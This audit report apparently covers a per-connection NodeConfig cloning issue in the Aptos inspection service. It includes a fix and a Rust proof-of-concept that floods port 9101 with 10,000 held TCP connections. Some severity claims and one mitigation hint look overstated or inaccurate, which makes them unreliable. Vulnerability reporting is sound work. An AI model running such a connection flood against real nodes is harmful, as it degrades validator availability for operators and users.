# Audit Report

## Title
Resource Exhaustion via Expensive NodeConfig Cloning in Inspection Service Connection Handler

## Summary
The Aptos inspection service clones the entire `NodeConfig` structure for each incoming TCP connection instead of wrapping it in `Arc`, enabling resource exhaustion attacks through rapid connection cycling. An attacker can open thousands of connections to port 9101, causing memory spikes and CPU exhaustion that degrade validator performance and consensus participation.

## Finding Description

The inspection service's connection handler at [1](#0-0)  uses `make_service_fn` to create a new service instance for each connection. This closure clones `node_config` for every incoming connection, performing an expensive deep copy of the entire configuration structure. [2](#0-1) 

`NodeConfig` contains approximately 25 sub-configuration structures, each with their own fields. Cloning this structure is computationally expensive and allocates significant memory.

**Architectural Flaw Compared to Other Services:**

The API service properly wraps `NodeConfig` in `Arc` to enable cheap reference-counted clones: [3](#0-2) 

The admin service similarly uses `Arc<Context>` to avoid expensive clones: [4](#0-3) 

However, the inspection service directly clones the heavy `NodeConfig` structure without Arc wrapping, creating a resource exhaustion vulnerability.

**Attack Scenario:**

1. Attacker identifies the inspection service port (default 9101) which is publicly accessible without authentication
2. Attacker opens 10,000+ simultaneous TCP connections using a simple script
3. Each connection triggers a full `NodeConfig` clone (~several KB per clone)
4. Total memory consumption: 10,000 connections Ã— several KB = tens to hundreds of MB
5. CPU exhaustion from repeated expensive clone operations
6. Validator node experiences degraded performance, potentially missing consensus rounds
7. If memory exhaustion reaches critical levels, OOM killer may terminate the validator process

**Broken Invariant:**
This violates the "Resource Limits" invariant: "All operations must respect gas, storage, and computational limits." While not gas-related, this creates unbounded resource consumption that can affect validator availability.

## Impact Explanation

**Severity: High** (per Aptos bug bounty criteria: "Validator node slowdowns")

This vulnerability enables an unprivileged attacker to:
- **Degrade validator performance** through memory and CPU exhaustion
- **Impact consensus participation** by causing the validator to miss rounds due to system resource contention
- **Potentially crash the validator** if OOM conditions are reached
- **No authentication required** - the inspection service port is publicly accessible

The impact directly maps to "Validator node slowdowns" listed as High severity in the bug bounty program. While not causing consensus safety violations or fund loss, it affects validator availability and network liveness.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low attack complexity**: Simple TCP connection cycling script (< 20 lines of code)
2. **No authentication**: Port 9101 is publicly accessible by default [5](#0-4) 
3. **No rate limiting**: The service lacks connection limits or rate limiting [6](#0-5) 
4. **Easily discoverable**: Standard port scanning reveals the service
5. **Immediate impact**: Resource exhaustion occurs during the attack, not requiring sustained effort

## Recommendation

Wrap `NodeConfig` in `Arc` to enable cheap reference-counted cloning, matching the pattern used by the API and Admin services:

```rust
// In start_inspection_service function
pub fn start_inspection_service(
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) {
    // ... existing code ...
    
    // Wrap node_config in Arc for efficient cloning
    let node_config = Arc::new(node_config);
    
    thread::spawn(move || {
        let make_service = make_service_fn(move |_conn| {
            let node_config = node_config.clone();  // Now just increments Arc refcount
            let aptos_data_client = aptos_data_client.clone();
            let peers_and_metadata = peers_and_metadata.clone();
            async move {
                Ok::<_, Infallible>(service_fn(move |request| {
                    serve_requests(
                        request,
                        node_config.clone(),  // Cheap Arc clone
                        aptos_data_client.clone(),
                        peers_and_metadata.clone(),
                    )
                }))
            }
        });
        // ... rest of function
    });
}

// Update serve_requests signature
async fn serve_requests(
    req: Request<Body>,
    node_config: Arc<NodeConfig>,  // Changed from NodeConfig
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
    // ... existing implementation (dereference Arc where needed)
}
```

Additionally, consider implementing connection limits at the Hyper server level using `http1_max_buf_size` or adding rate limiting middleware.

## Proof of Concept

```rust
// File: inspection_service_dos_poc.rs
// Demonstrates resource exhaustion via rapid connection cycling

use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let target = "127.0.0.1:9101"; // Inspection service port
    let num_connections = 10000;
    let mut handles = vec![];

    println!("[*] Starting resource exhaustion attack against inspection service...");
    println!("[*] Opening {} connections to {}", num_connections, target);

    for i in 0..num_connections {
        let handle = thread::spawn(move || {
            match TcpStream::connect(target) {
                Ok(stream) => {
                    // Keep connection open to maximize resource consumption
                    thread::sleep(Duration::from_secs(60));
                    drop(stream);
                }
                Err(e) => eprintln!("Connection {} failed: {}", i, e),
            }
        });
        handles.push(handle);

        // Small delay to avoid local port exhaustion
        if i % 100 == 0 {
            thread::sleep(Duration::from_millis(10));
        }
    }

    println!("[*] All connections established. Monitor validator memory/CPU.");
    println!("[*] Each connection caused a full NodeConfig clone (~several KB)");
    
    for handle in handles {
        let _ = handle.join();
    }
}
```

**Expected behavior:**
- Validator node memory increases by tens to hundreds of MB
- CPU usage spikes from repeated expensive clone operations
- Validator may experience degraded consensus performance
- Service responds slowly or becomes unresponsive

**Notes:**
- This is not a traditional memory leak (Rust's ownership ensures cleanup when connections close)
- Resource exhaustion is temporary but sustained during the attack
- The vulnerability stems from architectural inefficiency (not using Arc) rather than memory safety bugs
- Impact is limited to validator availability, not consensus safety or fund loss

### Citations

**File:** crates/aptos-inspection-service/src/server/mod.rs (L77-91)
```rust
        let make_service = make_service_fn(move |_conn| {
            let node_config = node_config.clone();
            let aptos_data_client = aptos_data_client.clone();
            let peers_and_metadata = peers_and_metadata.clone();
            async move {
                Ok::<_, Infallible>(service_fn(move |request| {
                    serve_requests(
                        request,
                        node_config.clone(),
                        aptos_data_client.clone(),
                        peers_and_metadata.clone(),
                    )
                }))
            }
        });
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L93-100)
```rust
        // Start and block on the server
        runtime
            .block_on(async {
                let server = Server::bind(&address).serve(make_service);
                server.await
            })
            .unwrap();
    });
```

**File:** config/src/config/node_config.rs (L35-92)
```rust
#[derive(Clone, Debug, Default, Deserialize, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct NodeConfig {
    #[serde(default)]
    pub admin_service: AdminServiceConfig,
    #[serde(default)]
    pub api: ApiConfig,
    #[serde(default)]
    pub base: BaseConfig,
    #[serde(default)]
    pub consensus: ConsensusConfig,
    #[serde(default)]
    pub consensus_observer: ConsensusObserverConfig,
    #[serde(default)]
    pub dag_consensus: DagConsensusConfig,
    #[serde(default)]
    pub dkg: DKGConfig,
    #[serde(default)]
    pub execution: ExecutionConfig,
    #[serde(default)]
    pub failpoints: Option<HashMap<String, String>>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub full_node_networks: Vec<NetworkConfig>,
    #[serde(default)]
    pub indexer: IndexerConfig,
    #[serde(default)]
    pub indexer_grpc: IndexerGrpcConfig,
    #[serde(default)]
    pub indexer_table_info: IndexerTableInfoConfig,
    #[serde(default)]
    pub inspection_service: InspectionServiceConfig,
    #[serde(default)]
    pub jwk_consensus: JWKConsensusConfig,
    #[serde(default)]
    pub logger: LoggerConfig,
    #[serde(default)]
    pub mempool: MempoolConfig,
    #[serde(default)]
    pub netbench: Option<NetbenchConfig>,
    #[serde(default)]
    pub node_startup: NodeStartupConfig,
    #[serde(default)]
    pub peer_monitoring_service: PeerMonitoringServiceConfig,
    /// In a randomness stall, set this to be on-chain `RandomnessConfigSeqNum` + 1.
    /// Once enough nodes restarted with the new value, the chain should unblock with randomness disabled.
    #[serde(default)]
    pub randomness_override_seq_num: u64,
    #[serde(default)]
    pub state_sync: StateSyncConfig,
    #[serde(default)]
    pub storage: StorageConfig,
    #[serde(default)]
    pub transaction_filters: TransactionFiltersConfig,
    #[serde(default)]
    pub validator_network: Option<NetworkConfig>,
    #[serde(default)]
    pub indexer_db_config: InternalIndexerDBConfig,
}
```

**File:** api/src/context.rs (L72-77)
```rust
#[derive(Clone)]
pub struct Context {
    chain_id: ChainId,
    pub db: Arc<dyn DbReader>,
    mp_sender: MempoolClientSender,
    pub node_config: Arc<NodeConfig>,
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L127-134)
```rust
            let make_service = make_service_fn(move |_conn| {
                let context = context.clone();
                async move {
                    Ok::<_, Infallible>(service_fn(move |req| {
                        Self::serve_requests(context.clone(), req, enabled)
                    }))
                }
            });
```

**File:** config/src/config/inspection_service_config.rs (L26-36)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```
